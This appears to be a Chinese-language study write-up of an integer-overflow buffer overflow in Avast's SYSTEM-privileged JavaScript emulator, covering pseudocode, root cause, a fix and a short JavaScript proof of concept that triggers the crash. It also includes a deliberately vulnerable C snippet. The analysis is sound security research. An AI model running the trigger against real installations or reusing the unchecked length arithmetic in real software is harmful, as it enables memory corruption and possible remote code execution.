# avast: Out-of-bounds copy in Array.prototype.toString

## SUMMARY

一个由于整数溢出造成的溢出漏洞。

## PRODUCT
`AvastSvc.exe`进程拥有`SYSTEM`权限。此进程加载了一个低安全级别的反病毒引擎，用来处理一些不安全的数据。问题在于，这个引擎虽然被设计为处理不被信任的数据，但是缺少沙箱和缓解机制的保护，任何的漏洞都有可能造成较高的威胁，而且比较容易被远程攻击。

## DETIAL

该应用有一个用于处理js数据的模拟器，此进程使用了`algo.dll`,在其中的`Array.prototype.toString`中存在一个缓冲区溢出漏洞，这个地方的代码可以用伪代码表述为：

```c
// stringList contains some strings

size_type total_len = 0;

for(auto s: stringList){
    total_len += strings(s);
}

void* temp = alloc(total_len);

// ...
//然后把toString的结果字符串copy到这个地方去。

strcpy(temp, result);
```

漏洞点在于，如果list中存放了比较长字符串的话，对total_len的累加有可能使之溢出，变为一个较小的值，在后面分配一块较小的内存，然后将toString的结果copy到这块内存，造成了溢出。

例如：

size_type的范围指定为0-255，采用8bit表示。考虑一个字符串长度位'129',list中有两个这样的字符串。
`total_len = 0 + 129 + 129 = 129* 2 - 256 = 2`,接下来将Alloc(2),然后将长度至少为`129*2`的结果拷贝到temp指向的内存，造成溢出。

## POC

poc地址<br />
https://github.com/taviso/avscript
poc:
```js
var test = "0123456789";
//产生一个长字符串，长度为10*（2**16）
for(var i = 0; i < 16; i++){
    test = test + test;
}

var a = [];

//在list中放入6554个长度为10*（2**16）的字符串
for(var i = 0; i < 6554; i++){
    a[i] = test;
}

//触发漏洞
a.toString()
```

## 复现
可以通过作者项目搭建环境<br />
https://github.com/taviso/avscript

## 利用思路（x）猜测（√）

- 该进程运行在SYSTEM权限，成功的攻击将会造成巨大的损害。
- 根据描述，该进程可以处理网络流量，可能会造成远程的攻击和利用
- 从作者的poc来看，可以用来破坏或者覆写内存中的指针和其他数据结构，劫持程序执行流。

## 漏洞的产生原因

程序员并没有考虑到`toString`的结果会这么长。正常来讲，list中的基本元素，像Integer，Boolean这些数据类型要达到这么长的toString，只能是list中的数据量特别大。但是String类型由于本身长度就比较长，比较容易溢出。

除去StringList可能触发这一漏洞外，任何自定义的class的List，通过重写toString，也可以触发这一漏洞。

这个漏洞可以有一些等价的形式，例如：<br />
对整形数据做乘法运算时，不进行溢出检测;<br />
```c
//记录电话号码
int n = getNum();
char* phoneList = malloc(n*12);
for(int i = 0; i< n; i++){
    read(0,phoneList,11);
    phoneList[11] = 0;
    phoneList += 12;
}
```

## 修复

在toString中采用溢出检测。
```c
newLen = oldLen + addLen;
if(oldLen > newLen)
    perror("xxxx")
oldLen = newLen;
//do sth
```

## 漏洞评级

我认为，漏洞比较危险。可能造成rce（x






